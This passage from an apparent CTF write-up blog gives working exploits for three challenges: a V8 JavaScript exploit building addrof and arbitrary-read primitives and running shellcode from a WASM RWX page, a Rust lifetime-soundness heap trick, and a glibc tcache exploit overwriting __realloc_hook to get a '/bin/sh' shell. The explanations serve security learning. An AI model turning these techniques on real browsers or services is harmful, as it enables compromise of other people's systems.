float_arr_elem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (float_arr.length === <span class="number">2048</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[+] Corruption successful!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[!] Corruption failed. Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">throw</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup addrof primitive</span></span><br><span class="line"><span class="comment">// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]</span></span><br><span class="line"><span class="comment">// We simply set addrof_arr[0] to the object whose address we want to leak</span></span><br><span class="line"><span class="comment">// Then we read from float_arr[4]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    addrof_arr[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> ftoi(float_arr[<span class="number">4</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Addrof primitive has been setup&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup an arbitrary read primitive for the V8 compressed heap</span></span><br><span class="line"><span class="comment">// We do this by overwriting the elements pointer of our arb_read_arr to a</span></span><br><span class="line"><span class="comment">// chosen address - 8 (making sure to keep the length set to 0x1000). We</span></span><br><span class="line"><span class="comment">// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).</span></span><br><span class="line"><span class="comment">// The elements pointer of arb_read_arr is at float_arr[17], offset found</span></span><br><span class="line"><span class="comment">// through GDB.</span></span><br><span class="line"><span class="comment">// addr must be a 32-bit value here</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compressed_arb_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    float_arr[<span class="number">17</span>] = itof((<span class="number">0x1000n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> ftoi(arb_read_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Arbitrary read primitive for the compressed heap has been setup&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup a function that writes our shellcode to a given address</span></span><br><span class="line"><span class="comment">// We do this by overwriting the backing store address of the ArrayBuffer we</span></span><br><span class="line"><span class="comment">// previously allocated to our chosen address. We then use the DataView that we</span></span><br><span class="line"><span class="comment">// also allocated to write our shellcode to that address space.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Using GDB, we find that the backing store address of our ArrayBuffer is</span></span><br><span class="line"><span class="comment">// misaligned at float_arr[20] and float_arr[21]. The misalignment is as</span></span><br><span class="line"><span class="comment">// follows:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of</span></span><br><span class="line"><span class="comment">//   the backing store address</span></span><br><span class="line"><span class="comment">// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of</span></span><br><span class="line"><span class="comment">//   the backing store address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If this is confusing to you, that&#x27;s because it is very confusing :p I would</span></span><br><span class="line"><span class="comment">// suggest looking at this in GDB and comparing whatever I mentioned above to</span></span><br><span class="line"><span class="comment">// what you see in GDB until it makes sense</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// addr must be a 64-bit value here</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// The backing store address of buf is not aligned to 64 bytes, so we have</span></span><br><span class="line">    <span class="comment">// to write the upper 32-bits and the lower 32-bits of our address to two</span></span><br><span class="line">    <span class="comment">// separate indices like this</span></span><br><span class="line">    float_arr[<span class="number">20</span>] = itof((addr &amp; <span class="number">0xffffffffn</span>) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    float_arr[<span class="number">21</span>] = itof((addr &amp; <span class="number">0xffffffff00000000n</span>) &gt;&gt; <span class="number">32n</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// msfvenom -p linux/x64/exec CMD=&#x27;./flagprinter&#x27; --format dword</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0x99583b6a</span>, <span class="number">0x622fbb48</span>, <span class="number">0x732f6e69</span>, <span class="number">0x48530068</span>, <span class="number">0x2d68e789</span>, <span class="number">0x48000063</span>, <span class="number">0xe852e689</span>, <span class="number">0x0000000e</span>, </span><br><span class="line"><span class="number">0x6c662f2e</span>, <span class="number">0x72706761</span>, <span class="number">0x65746e69</span>, <span class="number">0x57560072</span>, <span class="number">0x0fe68948</span>, <span class="number">0x00000005</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now, we leak the address of our RWX page</span></span><br><span class="line"><span class="comment">// Using GDB, we know this address is at *(&amp;wasm_instance + 0x68)</span></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = compressed_arb_read(addrof(wasm_instance) + <span class="number">0x68n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] RWX page address found: &quot;</span> + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Finally, we copy our shellcode to the RWX page and call the WASM function to</span></span><br><span class="line"><span class="comment">// execute it.</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Copying ./flagprinter shellcode to RWX page&quot;</span>);</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Printing flag!&quot;</span>);</span><br><span class="line">f();</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="6-Zombie"><a href="#6-Zombie" class="headerlink" title="6 [Zombie]"></a>6 [Zombie]</h2><p>This is a medium heap exploit which involves exploiting a soundness hole in the rust type system. Everything is already set up for you, so you don’t have to think too hard about the actual soundness hole though.</p>
<p>The idea here is that you first create a dangling reference to a freed block of memory on the heap. This is done through the <code>infect</code> command, which calls the <code>zombie</code> function with a user provided parameter.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">zombie</span></span>(size: <span class="built_in">usize</span>) -&gt; &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> [<span class="built_in">u8</span>] &#123;</span><br><span class="line">	<span class="keyword">let</span> <span class="keyword">mut</span> object = <span class="built_in">vec!</span>[<span class="string">b&#x27;A&#x27;</span>; size];</span><br><span class="line">	<span class="keyword">let</span> r = virus(object.as_mut());</span><br><span class="line">	r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This zombie function first creates a heap allocated array filled with 0x41 of a user defined size, then calls the <code>virus</code> function.</p>
<p>This is a modification of rustlang issue 25860 as hinted in the code comments.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rust-lang/rust/issues/25860">https://github.com/rust-lang/rust/issues/25860</a></p>
<p>This is a long standing hole in rust’s (normally memory safe) type system which allows one to convert a reference lifetime to the static lifetime and therefore bypass rust’s borrow checker: convert <code>&amp;&#39;a T</code> to <code>&amp;&#39;static T</code> and a big no-no for memory safety.</p>
<p>I have modified this to work with a mutable pointer so now there is a dangling reference which can be used to both read from, and write to the freed block of memory.</p>
<p>Usually this could be done easily using rust’s <code>unsafe</code> keyword, but I decided to make this challenge extra baffling in exchange for source code access.</p>
<h3 id="The-Challenge"><a href="#The-Challenge" class="headerlink" title="The Challenge"></a>The Challenge</h3><p>The idea behind this challenge is that we have a shell with various commands, one of which is the “get flag” command, however that command is hardcoded to be ignored and a new command read in.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> line.as_str().trim() &#123;</span><br><span class="line">	<span class="string">&quot;get flag&quot;</span> =&gt; <span class="keyword">continue</span>,</span><br><span class="line">	<span class="string">&quot;infect&quot;</span> =&gt; infected = <span class="literal">Some</span>(infect(&amp;<span class="keyword">mut</span> lines)),</span><br><span class="line">	<span class="string">&quot;eat brains&quot;</span> =&gt; eat_brains(&amp;<span class="keyword">mut</span> lines, &amp;<span class="keyword">mut</span> infected),</span><br><span class="line">	<span class="string">&quot;inspect brains&quot;</span> =&gt; inspect_brains(&amp;<span class="keyword">mut</span> lines, &amp;<span class="keyword">mut</span> infected),</span><br><span class="line">	_ =&gt; (),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>after the command is finished executing there is another check to see if the command was “get flag”, and if it was the flag is printed out.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> line.as_str().trim() == <span class="string">&quot;get flag&quot;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> flag = read_to_string(<span class="string">&quot;flag.txt&quot;</span>).unwrap();</span><br><span class="line">	<span class="built_in">println!</span>(<span class="string">&quot;Here&#x27;s the flag: &#123;&#125;&quot;</span>, &amp;flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So we need to change the command while it is still inside the buffer during the execution of one of our commands.</p>
<p>We also have other commands, “eat brains” and “inspect brains” which allow us to read from and write to our dangling reference returned from the <code>infect</code> function.</p>
<p>The final piece of the puzzle is understanding how the <code>String</code> struct works in rust. It contains a pointer to the heap, and will reallocate to grow when all the heap space for its buffer is used up. In this case we are reading stdin line by line, so if a line is longer than any have previously been, it is possible to force the String struct in the line variable to reallocate to a buffer that we have previously freed.</p>
<h3 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h3><p>First our normal setup:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<p>Now our first step is to create our dangling pointer:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&quot;infect&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>This will create a pointer to a 32 byte piece of freed memory and then store that in the <code>infected</code> variable in main.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&quot;eat brains                     &quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Since the <code>.trim()</code> is called on each line before it is compared against the instructions, the trailing whitespace in this command will be ignored and the command recognised as “eat brains”.</p>
<p>The purpose of the trailing whitespace here is to force the line containing this command to allocate a 32 byte buffer to store the command. This will take the buffer we have previously freed and have a dangling reference to back out of the freed bins and use it as part of the string buffer.</p>
<p>Now we have also entered the “eat brains” function at the same time, so we are able to modify the buffer that now contains the “eat brains                     “ string.</p>
<p>The final piece of this puzzle is understanding how strings work in rust. Unlike in C, rust strings are not null terminated, instead the length of the string is stored alongside the pointer to the string and therefore in this case we do not have control over the length of the string.</p>
<p>If we simply replaced the first few bytes of the command buffer with the command we wanted and a null terminator we would end up with:<br>“get flag\x00s                     “</p>
<p>When this is <code>.trim()</code>ed the result would be “get flag\x00s” which would not match the required string “get flag”. Instead we overwrite a few more bytes of the command with the space character:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brains</span>(<span class="params">string</span>):</span></span><br><span class="line">	counter = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">		p.sendline(<span class="built_in">str</span>(counter))</span><br><span class="line">		p.sendline(<span class="built_in">str</span>(<span class="built_in">ord</span>(c)))</span><br><span class="line">		counter += <span class="number">1</span></span><br><span class="line">	p.sendline(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br><span class="line">brains(<span class="string">&quot;get flag  &quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Note the additional spaces at the end of the command, this will overwrite the “ns” in “brains” and cause the <code>.trim()</code> method to trim the command down to “get flag”, which then prints the flag.</p>
<h2 id="7-VECC"><a href="#7-VECC" class="headerlink" title="7-VECC"></a>7-VECC</h2><p>This is a hard heap exploitation challenge.</p>
<p>The idea is to first obtain a read/write primitive on the heap, then progressively leak data until you know the location of libc, then overwrite the <code>__realloc_hook</code> to call <code>system(/bin/sh)</code>.</p>
<h3 id="1-Identifying-the-vulnerability"><a href="#1-Identifying-the-vulnerability" class="headerlink" title="1 - Identifying the vulnerability"></a>1 - Identifying the vulnerability</h3><p>The first thing to note when inspecting the binary logic is that bounds are being checked correctly so we have no buffer overflows or heap corruption, and there are no obvious double-frees or use-after-frees, however there is the glaring vulnerability that allocations are never zeroed and we must leverage this and only this to get a shell.</p>
<h3 id="2-The-essence-of-the-vulnerability"><a href="#2-The-essence-of-the-vulnerability" class="headerlink" title="2 - The essence of the vulnerability"></a>2 - The essence of the vulnerability</h3><p>For this exploit all you need is the tcache. There are the <code>vecc</code>s - which are simillar to c++’s <code>std::vector</code> or rust’s <code>Vec</code>. This is a small struct with a pointer (to a buffer), a length (of the used portion of the buffer), and a capacity (the maximum buffer length before reallocation is necessary). When a vecc is first created all fields should be NULLed to signal that a new buffer must be allocated upon first usage.</p>
<p>The key here is to notice that since allocations are not zeroed it is possible to groom the stack, then allocate a vecc from a tcache chunk without erasing the data on it.</p>
<p>This means that your allocated struct will leave the pointer as the <code>fd</code> pointer of the chunk from the tcache, as well as leaving the length and capacity unchanged from when the chunk was freed.</p>
<p>Furthermore since we have some control over the stack, it is possible to force this chunk <code>fd</code> pointer to point to another vecc struct as if it was the buffer of our new allocation.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> A                  B</span><br><span class="line">+-----------+      +-----------+      +-----------+</span><br><span class="line">| buf +----------&gt; | buf +----------&gt; | actual    |</span><br><span class="line">+-----+-----+      +-----+-----+      | buffer    |</span><br><span class="line">| len | cap |      | len | cap |      |           |</span><br><span class="line">+-----+-----+      +-----+-----+      +-----------+</span><br></pre></td></tr></table></figure>

<p>Once we have the above structure we are free to use A to overwrite all 3 fields of B as if it was a regular byte buffer, then use B to read or write data at will.</p>
<p>This is made a little more difficult in that we do not have arbitrary write on the buffer of any of our veccs, instead we only have the ability to clear and append to the buffers.</p>
<p>The clear operation simply zeroes the <code>len</code> field of the struct and does nothing else.</p>
<p>The append operation is a little more complicated, it:</p>
<ul>
<li>Allocates a temporary buffer of user defined size n</li>
<li>Reads n bytes into the temporary buffer</li>
<li>Checks whether <code>len</code> + n &gt; <code>cap</code> - this would overflow the buffer</li>
<li>If necessary reallocates the vecc’s buffer to the next power of 2 size that would fit the existing buffer and the n new bytes while copying the data across, <code>cap</code> it also updated</li>
<li>Append the user data from the temporary buffer to the vecc’s buffer now that we’re sure we can not overflow it</li>
<li>Free the temporary buffer</li>
<li>Update the <code>len</code> to reflect the size of the new used portion of the buffer</li>
</ul>
<p>The end result is that a temp buffer is allocated and freed, and the vecc’s buffer is possibly reallocated to fit the required size, then the user data is appended to the vecc’s existing data.</p>
<p>Once we have our crafted heap structure we can use a clear, followed by an append to overwrite the entire vecc struct at will.</p>
<h3 id="3-The-exploit"><a href="#3-The-exploit" class="headerlink" title="3 - The exploit"></a>3 - The exploit</h3><p>For this exploit we first do some housekeeping since we have a shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_proc</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_vecc</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy_vecc</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_vecc</span>(<span class="params">index, buffer, readline=<span class="literal">True</span></span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	p.recvline()</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(buffer)))</span><br><span class="line">	p.send(buffer)</span><br><span class="line">	<span class="keyword">if</span> readline:</span><br><span class="line">		p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_vecc</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_vecc</span>(<span class="params">index, <span class="built_in">bytes</span></span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	<span class="keyword">return</span> p.recv(<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;localhost&quot;, 1337)</span></span><br><span class="line">p = process(<span class="string">&quot;../publish/vecc&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>This simply reflects all of the shell commands we might need to use. Now lets get to grooming the heap for our primitive.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create_vecc(<span class="number">0</span>)</span><br><span class="line">append_vecc(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<p>We first create a vecc struct then append bytes to it.</p>
<p>It is important to write 0x10 bytes to this buffer since our aim is to have this buffer later interpreted as a vecc struct. For this to work we must make sure that it will be placed in the same tcache bin as a vecc struct would and therefore we should match the size of the vecc struct.</p>
<p>Note that this will also allocate and free a temporary buffer of size 0x10 while user data is read in, we now have 1 chunk in the tcache.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">destroy_vecc(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>After this line first the vecc’s buffer will be freed, then the vecc will be NULLed and freed.</p>
<p>Now the tcache looks like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcachebin:</span><br><span class="line"></span><br><span class="line">(was vecc)         (was buffer)       (was temp)</span><br><span class="line">+-----------+      +-----------+      +-----------+</span><br><span class="line">| fd  +----------&gt; | fd  +----------&gt; | fd &#x3D; NULL |</span><br><span class="line">| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |</span><br><span class="line">| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |</span><br><span class="line">+-----------+      +-----------+      +-----------+</span><br></pre></td></tr></table></figure>

<p>Finally we complete our crafted structure:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create_vecc(<span class="number">1</span>)</span><br><span class="line">create_vecc(<span class="number">2</span>)</span><br><span class="line">create_vecc(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>Now we have allocated back from the tcache with some new structure:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 1                  2                  3</span><br><span class="line">+-----------+      +-----------+      +-----------+</span><br><span class="line">| buf +----------&gt; | buf +----------&gt; | buf &#x3D; NULL|</span><br><span class="line">+-----+-----+      +-----+-----+      +-----+-----|</span><br><span class="line">| 000 | 000 |      | AAA | AAA |      | AAA | AAA |</span><br><span class="line">+-----+-----+      +-----+-----+      +-----------+</span><br></pre></td></tr></table></figure>

<p>Since 1 has capacity 0 any write will resule in a reallocation, so we don’t touch 1 from now on, but now with 2 and 3 we have the same structure as in the original diagram - we are able to use 2 to overwrite the entire of 3, then utilise 3 for arbitrary read / write.</p>
<p>Now we know we have PIE disabled, therefore we are able to leak libc addresses from the GOT.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">puts_got = <span class="number">0x601fa0</span></span><br><span class="line">clear_vecc(<span class="number">2</span>)</span><br><span class="line">append_vecc(<span class="number">2</span>, p64(puts_got) + p32(<span class="number">8</span>) + <span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">puts_libc = u64(show_vecc(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Puts address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_libc)))</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x601f90</span></span><br><span class="line">clear_vecc(<span class="number">2</span>)</span><br><span class="line">append_vecc(<span class="number">2</span>, p64(free_got) + p32(<span class="number">8</span>) + <span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">free_libc = u64(show_vecc(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Free address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_libc)))</span><br></pre></td></tr></table></figure>

<p>This is enough to figure out the version of libc being used and the location of any other symbols needed.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_libc - <span class="number">0x809c0</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line">realloc_hook = libc_base + <span class="number">0x3ebc28</span></span><br><span class="line">str_bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Realloc hook address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(realloc_hook)))</span><br></pre></td></tr></table></figure>

<p>Now we overwrite our realloc hook with the address of <code>system</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clear_vecc(<span class="number">2</span>)</span><br><span class="line">append_vecc(<span class="number">2</span>, p64(realloc_hook) + p32(<span class="number">0</span>) + <span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">append_vecc(<span class="number">3</span>, p64(system))</span><br></pre></td></tr></table></figure>

<p>Finally, we overwrite the buffer pointer of one of our vecc structures with a pointer to “/bin/sh” from within libc, then trigger a reallocation by appending a single extra byte, giving us a shell.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clear_vecc(<span class="number">2</span>)</span><br><span class="line">append_vecc(<span class="number">2</span>, p64(str_bin_sh) + p32(<span class="number">8</span>) + p32(<span class="number">8</span>))</span><br><span class="line">append_vecc(<span class="number">3</span>, <span class="string">&quot;A&quot;</span>, readline=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/22/wp-down-under-ctf/" data-id="ckhemv84q005nwdcm92wmb3tv" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/09/26/wp-jk-2020/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          极客巅峰2020
        
      </div>
    </a>
  
  
    <a href="/2020/09/16/wp-2020-qwb-easypwn/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">wp 2020强网杯 easypwn</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
